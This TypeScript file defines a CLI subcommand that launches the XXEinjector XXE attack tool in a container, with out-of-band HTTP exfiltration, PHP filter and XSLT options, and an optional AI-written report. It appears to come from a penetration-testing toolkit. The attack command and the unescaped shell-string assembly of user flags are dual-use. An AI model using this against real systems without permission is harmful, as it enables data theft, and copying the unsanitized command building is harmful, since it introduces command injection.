import { Command, Option } from "commander";
import { existsSync } from "fs";
import { writeAIReport } from "../../lib/ai";
import { runInContainer } from "../../lib/container";
import { createFileStream } from "../../lib/files";
import { throwError } from "../../lib/utils";

export function register(cli: Command) {
  cli
    .description("run xxe attack (XXEinjector)")
    .version("1.0.0", "-V")
    .addOption(new Option("--id <id>", "output identifier").default(""))
    .addOption(new Option("--ai", "generate AI report").default(false))
    .addOption(
      new Option(
        "-t, --target <target>",
        "target request",
      ).makeOptionMandatory(),
    )
    .addOption(new Option("-H, --host <host>", "host").makeOptionMandatory())
    .addOption(new Option("-p, --path <path>", "path").default(""))
    .addOption(
      new Option("--flags-xeeinjector <flags>", "XXEinjector flags").default(
        "",
      ),
    )
    .action(
      async (opts: {
        id: string;
        ai: boolean;
        target: string;
        host: string;
        path: string;
        flagsXeeinjector: string;
      }) => {
        // Exist
        if (!existsSync(opts.target))
          throwError(`error: target file not found: ${opts.target}.`);
        // Setup
        const [, file] = createFileStream("web", "xxe", opts.id || opts.target);
        // Command
        let cmd = `figlet "ni" && `;
        // XXEinjector
        cmd += `figlet "xxeinjector" && `;
        cmd += `cd /opt/apps/XXEinjector/ && `;
        cmd += `ruby XXEinjector.rb --host=${opts.host} --file=/data/target.txt`;
        if (opts.path) cmd += ` --path=${opts.path}`;
        cmd += ` --oob=http --phpfilter --xslt ${opts.flagsXeeinjector}`;
        // Run
        const data = await runInContainer({
          cmd: cmd,
          stdout: process.stdout,
          fsout: file,
          files: [{ local: opts.target, remote: "/data/target.txt" }],
        });
        // AI
        if (opts.ai)
          await writeAIReport({ data, stdout: process.stdout, fsout: file });
      },
    );
}
